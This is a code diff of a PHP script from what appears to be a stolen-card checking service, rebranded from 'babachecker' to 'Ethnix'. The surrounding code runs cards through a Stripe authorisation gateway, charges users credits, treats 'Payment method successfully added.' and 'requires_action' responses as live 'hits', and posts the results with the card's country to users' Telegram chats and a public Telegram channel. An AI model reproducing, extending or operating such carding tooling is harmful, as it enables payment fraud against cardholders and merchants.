@@ -29,7 +29,7 @@ $userStatus = strtoupper($userData['status'] ?? 'FREE');
 $userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
 $currentCredits = (int)$userData['credits'];
 if ($userStatus === 'BANNED') {
-    echo json_encode(['Response' => 'You are banned from using babachecker.']);
+    echo json_encode(['Response' => 'You are banned from using Ethnix.']);
     exit;
 }
 if ($currentCredits < 2) { // Adjusted to 2 credits for NonSK Charge
@@ -285,7 +285,7 @@ if ((stripos($response, 'Payment method successfully added.') !== false)) {
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId) && ($hitSender === 'both' || $hitSender === 'charge')) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
@@ -298,7 +298,7 @@ if ((stripos($response, 'Payment method successfully added.') !== false)) {
         "<b>Response ?</b> {$err} ??\n" .
         "<b>Gateway ?</b> Auto Stripe Auth V1\n" .
         "????????\n" .
-        "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+        "<b>Hit From ?</b> <a href=\"https://ethnix.net\">Ethnix</a>";
 
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
@@ -332,7 +332,7 @@ elseif (stripos($response, 'requires_action') !== false) {
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId) && ($hitSender === 'both' || $hitSender === 'live')) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
@@ -370,7 +370,7 @@ elseif (stripos($response, 'requires_action') !== false) {
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId) && ($hitSender === 'both' || $hitSender === 'live')) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
@@ -409,7 +409,7 @@ elseif (stripos($response, 'requires_action') !== false) {
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId) && ($hitSender === 'both' || $hitSender === 'live')) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
@@ -446,7 +446,7 @@ elseif (stripos($response, 'requires_action') !== false) {
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId) && ($hitSender === 'both' || $hitSender === 'live')) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
